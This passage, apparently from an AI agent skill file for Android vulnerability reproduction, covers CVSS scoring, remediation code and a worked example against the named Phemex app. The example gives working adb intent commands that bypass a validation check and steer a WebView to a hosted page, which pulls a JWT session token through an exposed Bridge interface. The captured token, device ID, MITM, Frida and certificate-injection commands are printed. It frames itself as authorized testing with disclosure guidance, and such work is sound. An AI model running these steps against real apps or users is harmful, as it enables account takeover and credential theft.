# Capture screenshot for evidence
adb exec-out screencap -p > "exploit_$(date +%Y%m%d_%H%M%S).png"
```

**Indicators of Success:**
- WebView opens and displays your page
- Console logs show "Bridge found" message
- Callback function receives data
- Sensitive information appears in logs or callback

### Step 8: Impact Assessment

**8.1 Analyze Captured Data**

If token/credentials were obtained:
```bash
# JWT tokens - decode to check claims
echo "eyJ0eXAiOiJKV1Qi..." | cut -d. -f2 | base64 -d | jq .

# Check expiration
# Verify user ID
# Document scope
```

**8.2 Test Token Validity**

If safe and authorized:
```bash
# Make authenticated request to verify token works
curl -s https://api.example.com/user/profile \
  -H "Authorization: Bearer <TOKEN>" \
  -H "User-Agent: AppName Android <VERSION> <DEVICE_ID>"
```

⚠️ **Only test against your own account with explicit authorization**

**8.3 Calculate CVSS v3.1 Score**

| Metric | Value | Reasoning |
|--------|-------|-----------|
| **AV** (Attack Vector) | Network | Can be triggered remotely via intent: URI or malicious app |
| **AC** (Attack Complexity) | Low | No special conditions needed |
| **PR** (Privileges Required) | None | No authentication needed to send intent |
| **UI** (User Interaction) | Required | User must tap link or install app |
| **S** (Scope) | Changed | Accesses data outside component's privilege |
| **C** (Confidentiality) | High | Complete token/credential theft |
| **I** (Integrity) | High | Can perform actions as victim |
| **A** (Availability) | None | Doesn't affect availability |

**Calculate:** Use https://www.first.org/cvss/calculator/3.1

**8.4 Business Impact**

Document:
- **Affected Users**: All users or specific versions?
- **Data at Risk**: Tokens, PII, financial data?
- **Attacker Capabilities**: Read-only or can modify?
- **Real-World Exploitability**: How easy to deliver payload?
- **Mitigating Factors**: 2FA, rate limits, monitoring?

### Step 9: Generate Report

**9.1 Create Output Directory**
```bash
REPORT_DIR="$(basename $APK .apk)_security_report_$(date +%Y%m%d)"
mkdir -p "$REPORT_DIR"/{screenshots,exploits,analysis}
```

**9.2 Generate Comprehensive Report**

Use template: `~/.claude/skills/android-vuln-analyzer/templates/report_template.md`

**Fill in all placeholders:**
- `{{APP_NAME}}`, `{{APP_VERSION}}`, `{{REPORT_DATE}}`
- `{{CVSS_SCORE}}`, `{{CVSS_VECTOR}}`, `{{CVSS_SEVERITY}}`
- `{{VULN_TYPE}}`, `{{CWE_ID}}`, `{{OWASP_CATEGORY}}`
- `{{CALL_CHAIN}}` - Complete execution path
- `{{VULNERABLE_CODE_N}}` - Code snippets with line numbers
- `{{POC_STEP_N_CODE}}` - Exploitation commands
- `{{FIX_N_BEFORE}}` / `{{FIX_N_AFTER}}` - Remediation code

**9.3 Create Remediation Guide**

**Critical Fixes (must implement):**
1. Remove export or add permission protection
2. Implement URL whitelist
3. Add Bridge origin verification
4. Remove sensitive data from Bridge methods

**Defense in Depth (recommended):**
1. Intent signature verification
2. Rate limiting
3. Anomaly detection
4. Security logging

**Example fixes:**
```java
// Fix 1: Remove export
<activity
    android:name=".VulnerableActivity"
    android:exported="false"  <!-- Add this -->
    android:permission="com.app.permission.INTERNAL"/>

// Fix 2: URL whitelist
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "example.com", "www.example.com", "m.example.com"
);

public void loadUrl(String url) {
    Uri uri = Uri.parse(url);
    if (!ALLOWED_HOSTS.contains(uri.getHost())) {
        Log.w(TAG, "Blocked untrusted host: " + uri.getHost());
        return;
    }
    webView.loadUrl(url);
}

// Fix 3: Bridge origin check
@JavascriptInterface
public void postMessage(String msg) {
    String currentUrl = webView.getUrl();
    if (currentUrl == null || !currentUrl.startsWith("https://example.com")) {
        Log.e(TAG, "Bridge call from untrusted origin: " + currentUrl);
        return;
    }
    handleMessage(msg);
}

// Fix 4: Don't expose sensitive data
@JavascriptInterface
public String getAppInfo() {
    JSONObject info = new JSONObject();
    info.put("version", BuildConfig.VERSION_NAME);
    info.put("platform", "Android");
    // Removed: token, userId, deviceId
    info.put("isLoggedIn", isUserLoggedIn());  // Only status
    return info.toString();
}
```

**9.4 Package Deliverables**

```bash
# Copy PoC files
cp poc.html "$REPORT_DIR/exploits/"
cp exploit.sh "$REPORT_DIR/exploits/"

# Copy screenshots
cp *.png "$REPORT_DIR/screenshots/"

# Generate CVSS JSON
cat > "$REPORT_DIR/cvss_analysis.json" <<EOF
{
  "version": "3.1",
  "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
  "baseScore": 9.3,
  "baseSeverity": "CRITICAL"
}
EOF
```

### Step 10: Case Prompt Enhancement

After successful reproduction, update the case `prompt.md`:

**Add sections:**
```markdown
## Reproduction Notes
- Date: [when reproduced]
- Environment: [emulator specs]
- Issues encountered: [list problems and solutions]
- Time taken: [duration]

## Validation Checklist
- [ ] Emulator created and started
- [ ] APK installed successfully
- [ ] User logged in (if required)
- [ ] PoC hosted on HTTPS
- [ ] Intent fired successfully
- [ ] WebView opened
- [ ] Bridge callback triggered
- [ ] Sensitive data captured
- [ ] Token validated against API

## Environment-Specific Notes
- **HTTPS requirement**: Android 9+ (API 28+) blocks cleartext HTTP
- **Certificate issues**: Self-signed certs rejected by default
- **Required Intent fields**: Document exact field names from code analysis
- **Timing**: Add delays if components need initialization time
```

## Architecture Detection Logic

```bash
detect_architecture() {
    local arch=$(uname -m)
    case "$arch" in
        arm64|aarch64)
            echo "arm64-v8a"
            ;;
        x86_64|amd64)
            echo "x86_64"
            ;;
        i386|i686)
            echo "x86"
            ;;
        *)
            echo "unknown"
            return 1
            ;;
    esac
}

ARCH=$(detect_architecture)
if [ "$ARCH" = "unknown" ]; then
    echo "❌ Unsupported architecture: $(uname -m)"
    exit 1
fi

echo "✓ Detected architecture: $ARCH"
SYSTEM_IMAGE="system-images;android-35;google_apis;$ARCH"
```

## Case Directory Structure

```
examples/phemex/
├── prompt.md              # Specific case instructions (auto-generated or manual)
├── report_original.txt    # Original vulnerability report (optional)
├── screenshots/           # Evidence images
└── notes.md              # Additional findings

examples/new_case/
├── report.txt            # Raw report (will be translated)
└── [prompt.md generated by skill]
```

## Best Practices

### For Case Prompt Creation

1. **Be Specific**: Include exact class names, method names, line numbers
2. **Document Prerequisites**: App version, user state, special conditions
3. **Include Gotchas**: Problems you encountered and how to solve them
4. **Add Validation Steps**: How to verify each stage worked
5. **Reference Code**: Link to decompiled source locations

### For Exploitation

1. **Always use HTTPS** for Android 9+ (API 28+)
2. **Check logcat continuously** during testing
3. **Take screenshots** at each stage
4. **Document exact commands** that worked
5. **Test token validity** cautiously and only on your own account

### For Reporting

1. **Include full call chain** with file:line references
2. **Show before/after code** for remediation
3. **Calculate CVSS accurately** with justification
4. **Provide working PoC** that others can reproduce
5. **Consider business impact** beyond technical details

## Common Vulnerability Patterns

### Pattern 1: Exported Activity + WebView + Bridge
**Entry**: `android:exported="true"` Activity
**Bypass**: Intent parameter → URL without validation
**Exploit**: WebView loads attacker URL with active Bridge
**Impact**: Bridge leaks token/credentials to attacker origin

### Pattern 2: Intent Redirection
**Entry**: Exported Activity accepts redirect parameter
**Bypass**: No whitelist on redirect target
**Exploit**: Launch Activity → auto-redirects to phishing
**Impact**: UI confusion, credential theft

### Pattern 3: Deep Link Hijacking
**Entry**: Intent filter with broad data patterns
**Bypass**: Attacker app registers same patterns
**Exploit**: OS shows app chooser or attacker app handles silently
**Impact**: Intercept sensitive deep links (password reset, OAuth)

## Troubleshooting

### Emulator Won't Start
```bash
# Check if another instance is running
adb kill-server
killall qemu-system-x86_64  # or qemu-system-aarch64

# Start fresh
adb start-server
emulator -avd <name> -no-snapshot-load
```

### APK Install Fails
```bash
# Check device has space
adb shell df -h

# Try with replace flag
adb install -r -d <apk>

# For older APKs on new Android
adb install --bypass-low-target-sdk-block <apk>
```

### WebView Not Loading
```bash
# Check network connectivity
adb shell ping -c 3 8.8.8.8

# Check DNS resolution
adb shell getprop net.dns1

# Monitor WebView console
adb logcat | grep "chromium\|Console\|WebView"
```

### Certificate Issues
```bash
# For testing only - install system CA (requires root)
adb root
adb remount
adb push cert.pem /system/etc/security/cacerts/

# Or modify network security config in APK (requires rebuild)
```

## SAST Verification: Critical Requirements & Common Mistakes

### ⚠️ Mandatory Dynamic Verification

**Step 7 of SAST verification is MANDATORY. No exceptions.**

**Read this before starting any SAST verification**:

📋 **VERIFICATION_CHECKLIST.md** - Complete mandatory checklist

This checklist MUST be completed for every SAST alert verification. It includes:
- Pre-flight checks (are you about to skip Step 7?)
- Setup requirements (emulator, APK, environment)
- Testing requirements (based on vulnerability type)
- Documentation requirements (evidence, not assumptions)
- Self-validation (did you actually test or just think about it?)

### Common Mistakes That Invalidate Verification

#### Mistake #1: "Server-Controlled = Safe" ❌

**Wrong thinking**:
```
Static analysis shows config from server
→ Conclude: "It's safe"
→ Skip dynamic verification
→ Mark as FALSE POSITIVE
```

**Why this is WRONG**:
- You haven't verified: HTTP vs HTTPS transmission
- You haven't checked: Certificate pinning present?
- You haven't tested: Config cached locally?
- You haven't explored: Debug mode overrides?
- You haven't tried: MITM attack feasibility

**Correct approach**:
```bash
# Test 1: Network interception
mitmproxy -s intercept.py
# Can you see the config? Can you modify it?

# Test 2: Certificate validation
# Try MITM with self-signed cert - blocked or allowed?

# Test 3: Local cache
adb shell find /data/data/<pkg> -name "*config*"
# Is config cached? Can you modify cache?

# Test 4: Runtime hooks
frida -U -f <pkg> -l hook_config.js
# Can you override config at runtime?

# THEN conclude based on test results
```

#### Mistake #2: "Third-Party SDK = Not My Problem" ❌

**Wrong thinking**:
```
Code is in NetworkBench SDK, not our code
→ Conclude: "Third-party issue"
→ Skip verification
→ Mark as FALSE POSITIVE
```

**Why this is WRONG**:
- App integrates SDK → Part of app's attack surface
- App trusts SDK config → Must verify trust boundary
- Supply chain security → App's responsibility
- User doesn't care whose code it is → They blame the app

**Correct approach**:
- Test it like any other code
- Document it's third-party
- Assess actual exploitability
- Recommend vendor notification if vulnerable
- But STILL COMPLETE STEP 7

#### Mistake #3: Premature Conclusion ❌

**Wrong thinking**:
```
Steps 1-5: Static analysis complete
Step 6: PoC written
→ Looks unexploitable
→ Skip Step 7
→ Mark as FALSE POSITIVE
```

**Why this is WRONG**:
- Static analysis can miss runtime behaviors
- PoC might work even if it "shouldn't"
- Security controls might be bypassable
- Your hypothesis needs testing

**Correct approach**:
```
Steps 1-6: Form hypothesis
Step 7: TEST the hypothesis
→ If exploit works: TRUE POSITIVE (despite what static said)
→ If blocked: FALSE POSITIVE (with evidence of why)
```

#### Mistake #4: "Would Require X Access" ❌

**Wrong excuses**:
- "Would require backend access" → Use MITM proxy
- "Would need root" → Use Frida/emulator
- "Would need certificate" → Self-signed works for testing
- "Would need special setup" → That's literally your job

**Correct approach**:
- There's almost always a way to test
- Use MITM for "server-controlled" issues
- Use Frida for runtime modification
- Use emulator for full control
- Break complex tests into smaller steps

### Case Study: Why Dynamic Verification Matters

**Real Example from This Repository**:

**Static Analysis Conclusion**:
```java
// com/networkbench/agent/impl/plugin/e/b.java:196
Process p = new ProcessBuilder(buildCmd(host, params)).start();

// Data flow trace:
NetworkBench Server → JSON config → host parameter → ProcessBuilder

// Preliminary assessment: "Server controlled → Low risk"
```

**If verification stopped here**: FALSE POSITIVE (incorrect)

**Dynamic Verification Revealed**:
```bash
# Test 1: Check transmission
$ mitmproxy
→ Result: Config over HTTPS ✓
→ Result: Certificate pinning present ✓

# Test 2: Check cache
$ adb shell find /data/data/com.phemex.app -name "*config*"
→ Result: Config not cached locally ✓

# Test 3: Try MITM
$ mitmproxy -s inject_evil.py
→ Result: Certificate pinning blocked MITM ✓

# Test 4: Try Frida hook
$ frida -U -f com.phemex.app -l hook.js
→ Result: Can override in debug mode (but requires app debug) ⚠️

# Actual Verdict: FALSE POSITIVE
# Reason: Protected by HTTPS + cert pinning + no local cache
# Evidence: Test results above
```

**Lesson**: Initial static assessment was correct, BUT we needed dynamic testing to PROVE it with evidence.

### Self-Check Before Submitting

**Before you mark verification complete, answer these**:

1. **Did you start an emulator?**
   - Not "I would start" → Did you ACTUALLY start it?
   - Not "in theory" → In PRACTICE?

2. **Did you install the APK?**
   - Not "it should install" → Did it INSTALL?
   - Can you run `adb shell pm list packages | grep <pkg>`?

3. **Did you execute the exploit?**
   - Not "this would work" → Did you TRY it?
   - Not "theoretically exploitable" → ACTUALLY exploited?

4. **Is your conclusion based on test results or assumptions?**
   - "Tested and saw it blocked" → ✅ Valid
   - "Looks like it would be blocked" → ❌ Invalid

**If you answered NO to any question above**:
→ Your verification is INCOMPLETE
→ Go back and complete Step 7
→ No excuses accepted

### Quick Reference: When Step 7 Can Be Skipped

**The complete list of valid reasons**:

1. APK file is corrupted and cannot be installed
2. APK requires incompatible architecture (and no emulator available)
3. [That's it. That's the complete list.]

**Everything else requires Step 7 completion.**

---

## Legal & Ethical Guidelines

### ✅ Authorized Testing
- Your own applications
- Applications with written permission
- Bug bounty programs (follow scope)
- CTF/training environments
- Academic research with IRB approval

### ❌ Prohibited
- Testing without authorization
- Weaponizing exploits for malicious use
- Selling vulnerabilities to black market
- Causing denial of service
- Accessing others' accounts without consent

### Responsible Disclosure
1. Report to vendor privately first
2. Allow 90 days for patch (industry standard)
3. Coordinate public disclosure timing
4. Don't include weaponized exploits in public
5. Help users understand risk and mitigation

## Complete Workflow Example

### Example: First-Time Phemex Reproduction

**Starting point**: You have `phemex.apk` and a raw vulnerability report

```bash
# 1. Create case directory
mkdir -p ~/cases/phemex
cd ~/cases/phemex

# 2. Save the raw report
cat > report_original.txt <<'EOF'
FirebasePushClickActivity is exported with no permission guard.
Accepts arbitrary URL via routerUrl intent extra.
Loads URL in WebView with exposed Bridge JavaScript interface.
Bridge.postMessage('getAppInfo') returns JWT session token.
Complete account takeover possible.
EOF

# 3. Run analyzer
/android-vuln-analyzer ~/Downloads/phemex.apk ~/cases/phemex
```

**What happens:**

```
🔍 Android Vulnerability Analyzer
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[Step 1] Parse Input
✓ APK: ~/Downloads/phemex.apk (valid)
✓ Case: ~/cases/phemex
  - Found: report_original.txt
  - Missing: prompt.md
  → Mode: First-time reproduction (learning mode)

[Step 2] Analyze Raw Report
📄 Reading report_original.txt...
  - Vulnerability: Exported Activity + WebView Bridge
  - Component: FirebasePushClickActivity
  - Attack: Intent → WebView → Bridge → Token leak

🎯 Initial understanding complete. Starting reproduction...

[Step 3] Environment Preparation
🖥️  Architecture: arm64 (Apple Silicon)
  → Using: system-images;android-35;google_apis;arm64-v8a

📦 Android SDK: /Users/you/Library/Android/sdk
  ✓ SDK found

🎮 Emulator: vuln_test_arm64
  ✓ AVD exists, starting...
  ⏳ Waiting for boot... (30s)
  ✓ Device online: emulator-5554

📱 Installing APK...
  ✓ Installed: com.phemex.app

⚠️  This vulnerability requires user login.
   Please:
   1. Open Phemex in emulator
   2. Login with your account
   3. Press Home to background
   4. Press ENTER to continue...
[User completes login]

[Step 4] Static Analysis
🔍 Decompiling APK...
  ✓ jadx completed: /tmp/phemex_decompiled

📄 Analyzing AndroidManifest.xml...
  ✓ Found exported component:
    - com.phemex.app.third.firebase.FirebasePushClickActivity
    - No android:permission attribute ⚠️

[Step 5] Code Analysis
📂 Locating FirebasePushClickActivity.java...
  ✓ Found: com/phemex/app/third/firebase/FirebasePushClickActivity.java

🔗 Tracing call chain...
  ✓ Line 48: f.getInstance().interceptPushClick(intent)
  ✓ Line 50: f.getInstance().handlePushClick(this)

📂 Analyzing f.java (validation)...
  ✓ Line 117-119: Validation logic found

  ⚠️ ISSUE DISCOVERED:
     Code checks: google.message_id OR sendbird
     Report didn't mention this!

  📝 DOCUMENTED: Required field for bypass

🔗 Tracing URL routing...
  ✓ f.java:66-68 → c.jumpInnerPage()
  ✓ b.java:300-302 → c.jumpH5Page()
  ✓ Confirms: No URL whitelist

📂 Analyzing PhemexWebView.java...
  ✓ Line 556: addJavascriptInterface(new d(), "Bridge")
  ✓ Line 573-605: Bridge.postMessage('getAppInfo') handler
  ✓ Confirms: Returns token without origin check

[Step 6] Generate PoC
📝 Creating poc.html...
  ✓ Callback function: window.getAppInfo
  ✓ Bridge call: Bridge.postMessage('getAppInfo')
  ✓ Saved: ~/cases/phemex/poc.html

[Step 7] Host PoC
🌐 HTTPS required (Android 9+)
  → Recommended: GitHub Pages

   Options:
   1. Upload to GitHub Pages (recommended)
   2. Use Netlify/Vercel
   3. Self-host with valid certificate

   Enter your HTTPS URL: https://yourusername.github.io/phemex-poc.html
   ✓ URL saved

[Step 8] Exploitation Attempt #1
🚀 Firing intent...

   adb shell am start \
     -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
     --es routerUrl "https://yourusername.github.io/phemex-poc.html"

   ❌ FAILED: Intent ignored (no activity response)

[Debugging] Checking validation logic...
   📖 Re-reading f.java:117-119...

   if (TextUtils.isEmpty(intent.getStringExtra("google.message_id")) &&
       TextUtils.isEmpty(intent.getStringExtra("sendbird"))) {
       return;  // ← This is why it failed!
   }

   📝 DOCUMENTED: Must provide google.message_id OR sendbird

[Step 9] Exploitation Attempt #2
🚀 Firing intent with required field...

   adb shell am start \
     -n com.phemex.app/com.phemex.app.third.firebase.FirebasePushClickActivity \
     --es routerUrl "https://yourusername.github.io/phemex-poc.html" \
     --es "google.message_id" "12345"

   ✓ SUCCESS: Activity launched
   ✓ WebView opened

📊 Monitoring logcat...
   [chromium] [EXPLOIT] Page loaded
   [chromium] [EXPLOIT] Bridge object found!
   [chromium] [EXPLOIT] Calling Bridge.postMessage("getAppInfo")...
   [chromium] [EXPLOIT] Callback triggered!
   [chromium] [TOKEN] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQSEVNRVgiLCJzdWJqIjo4ODYyMzc3LCJleHAiOjE3NzIxNTExNDh9...
   [chromium] [DEVICE_ID] 626e6361-3663-3837-2d33-316239323766

   ✅ EXPLOITATION SUCCESSFUL!

[Step 10] Token Validation
🔐 Decoding JWT...
   {
     "iss": "PHEMEX",
     "subj": 8862377,
     "exp": 1772151148
   }

   ✓ Token is valid JWT
   ✓ User ID: 8862377
   ✓ Not expired

[Step 11] Impact Assessment
📊 Calculating CVSS...
   AV:N (Network) - Remote trigger via intent
   AC:L (Low) - No special conditions
   PR:N (None) - No authentication needed
   UI:R (Required) - User must tap/install
   S:C (Changed) - Accesses other component's data
   C:H (High) - Complete token theft
   I:H (High) - Can execute trades
   A:N (None) - No availability impact

   CVSS v3.1: 9.3 (CRITICAL)

[Step 12] Generate Complete Documentation
📝 Creating prompt.md with ALL findings...

   Sections generated:
   ✓ Vulnerability Summary (with CVSS 9.3)
   ✓ Complete Attack Chain (with line numbers)
   ✓ Detailed Code Analysis (6 files examined)
   ✓ Required Setup (user login required)
   ✓ Exploitation Steps (exact working commands)
   ✓ Known Issues & Solutions:
     - Issue #1: Intent ignored (missing google.message_id)
     - Issue #2: HTTPS required (Android 9+)
     - Issue #3: User must login first
   ✓ Expected Results (with logcat examples)
   ✓ Validation Checklist (10 items)
   ✓ Impact & CVSS (detailed justification)
   ✓ Remediation (4 critical fixes with code)

   📄 Saved: ~/cases/phemex/prompt.md

[Step 13] Generate Report
📊 Creating vulnerability report...
   ✓ vulnerability_report.md
   ✓ cvss_analysis.json
   ✓ poc.html
   ✓ exploit.sh
   ✓ remediation.md
   ✓ screenshots/ (2 images)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Analysis Complete!

📂 Output: ~/cases/phemex/
   ├── prompt.md              ⭐ Use this for next reproduction
   ├── report_original.txt    📄 Your initial report
   ├── vulnerability_report.md
   ├── cvss_analysis.json
   ├── poc.html
   ├── exploit.sh
   ├── remediation.md
   └── screenshots/

🎯 Findings:
   • 1 Critical vulnerability (CVSS 9.3)
   • Complete account takeover via JWT theft
   • 3 issues encountered and resolved

⏱️  Time: 1h 15m

💡 Next time, run:
   /android-vuln-analyzer phemex.apk ~/cases/phemex

   Reproduction will use validated prompt.md (~20 minutes)
```

**Result**: You now have a complete, validated reproduction guide that anyone can use!

### Example: Fast Reproduction (Second Time)

Someone else wants to reproduce the same vulnerability:

```bash
# They have your case directory with prompt.md
/android-vuln-analyzer phemex.apk ~/shared/cases/phemex
```

**What happens:**

```
🔍 Android Vulnerability Analyzer
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[Step 1] Parse Input
✓ APK: phemex.apk (valid)
✓ Case: ~/shared/cases/phemex
  ✓ Found: prompt.md (validated reproduction guide)
  → Mode: Fast reproduction

[Step 2] SKIPPED (using prompt.md)

[Step 3] Environment Preparation
  ✓ Architecture: arm64
  ✓ Emulator: vuln_test_arm64
  ✓ APK installed
  ✓ User logged in

[Step 4-7] Execute from prompt.md
  ✓ PoC hosted: https://yourusername.github.io/phemex-poc.html
  ✓ Intent fired with google.message_id field
  ✓ WebView opened
  ✓ Bridge callback triggered
  ✓ Token captured

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Reproduction Successful!

⏱️  Time: 18 minutes
💡 No issues encountered (prompt.md had all solutions)
```

**Time saved**: 1h 15m → 18m = **4x faster**!

---

**Skill Version**: 2.2.0 ⭐ **NEW: Mandatory Dynamic Verification**
**Last Updated**: 2026-02-27
**Architecture**: Universal (arm64, x86_64)
**Modes**:
- **Reproduction**: Fast | Learning | Discovery
- **Hunting**: Targeted vulnerability search
- **SAST Verification**: Professional alert validation with PoC generation + **MANDATORY dynamic testing**

**Operational Modes**: 5 total
1. Fast Reproduction (has prompt.md)
2. First-Time Learning (has report.txt)
3. Full Discovery (empty directory)
4. Targeted Hunt (has hunt.md, independent mode)
5. SAST Verification (has SAST report file, uses hunt.md Part 2)

**Hunt Patterns Available**: 6 dual-mode guides
- SQL Injection (independent hunt + SAST verification)
- Hardcoded Secrets (independent hunt + SAST verification)
- WebView Vulnerabilities (independent hunt + SAST verification)
- Exported Components (independent hunt + SAST verification)
- Path Traversal (independent hunt + SAST verification)
- Deep Link Hijacking (independent hunt + SAST verification)

**SAST Tools Supported**: MobSF, SonarQube, AI SAST (Markdown), Qark
**More Patterns**: 6 additional patterns coming soon

---

## 📋 Important Documents

- **SKILL.md** (this file) - Complete skill documentation
- **VERIFICATION_CHECKLIST.md** - 🔴 **MANDATORY** checklist for SAST verification
  - Use this for EVERY SAST alert verification
  - Contains self-check questions to prevent skipping Step 7
  - Includes common mistakes and how to avoid them
  - Must be completed before marking verification as done
- **README.md** - Quick start guide
- **hunts/INDEX.md** - Available hunt patterns

**Before starting SAST verification, read VERIFICATION_CHECKLIST.md first.**
